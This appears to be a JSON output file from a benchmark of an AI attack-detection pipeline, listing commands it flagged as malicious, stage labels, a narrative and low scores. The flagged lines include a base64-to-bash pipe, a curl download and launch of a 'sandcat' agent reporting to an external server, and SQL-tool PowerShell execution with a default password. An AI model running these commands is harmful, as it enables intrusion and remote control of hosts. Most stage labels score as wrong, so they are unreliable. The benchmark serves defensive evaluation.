@@ -1,0 +1,114 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuN6CuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "bash -c del /f /usr/tomcat/apache-tomcat-8.5.76//webapps/ROOT/logout.txt",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "bash -c del /f /q c:\\windows\\logout.jsp",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "bash -c sh -c \"sh -c which ps\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "bash -c sh -c \"sh -c /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "bash -c base64 -d | bash",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "bash -c /usr/local/hostguard/bin/curl -k --connect-timeout 10 \"https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648192557&mode=100\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "bash -c curl -O http://124.223.85.207:8079/sandcat-linux ; chmod +x sandcat-linux ;nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v > /dev/null 2>&1 &",
+        "stage": "Execution"
+      },
+      {
+        "command": "bash -c ./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami",
+        "stage": "Execution"
+      },
+      {
+        "command": "bash -c ./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec 'cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=\"https://124.223.85.207:8443\";",
+        "stage": "Execution"
+      },
+      {
+        "command": "bash -c if [[ -f /usr/bin/lsb_release ]];then /usr/bin/lsb_release -a | grep Description | awk -F : '{print $2}' | sed 's/^[ \t]*//g'; elif [[ -f /etc/system-release ]];then cat /etc/system-release | sed -n '1p'; else cat /etc/issue | sed -n '1p'; fi",
+        "stage": "Discovery"
+      },
+      {
+        "command": "bash -c ls -l /proc/[0-9]*/fd/[0-9]* | grep socket:",
+        "stage": "Discovery"
+      },
+      {
+        "command": "apt-helper wait-online",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "apt-helper wait-online",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "bash -c ./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec 'cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=\"https://124.223.85.207:8443\";",
+        "stage": "Execution"
+      },
+      {
+        "command": "sh (PID 295525): \"bash -c echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuN6CuMjAwLjIwMA== | base64 -d|bash\"",
+        "stage": "Initial Access"
+      }
+    ],
+    "narrative": "The attack starts with initial access via encoded shell commands. The intruder then executes various reconnaissance tasks using `ps` and `netstat`, and deploys malware like `sandcat`. Further execution steps include running SQL tools to escalate privileges and gather system information. Persistent mechanisms such as scheduled tasks and defense evasion techniques are also employed.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 49180,
+      "completion_tokens": 3038,
+      "total_tokens": 52218,
+      "wall_clock_s": 37.725,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.0625,
+      "recall": 0.14285714285714285,
+      "f1": 0.08695652173913043,
+      "tp": 1,
+      "fp": 15,
+      "fn": 6
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 16,
+      "fn": 7,
+      "recall_partial": 0.07142857142857142
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 49180,
+      "completion_tokens": 3038,
+      "total_tokens": 52218,
+      "wall_clock_s": 37.725,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
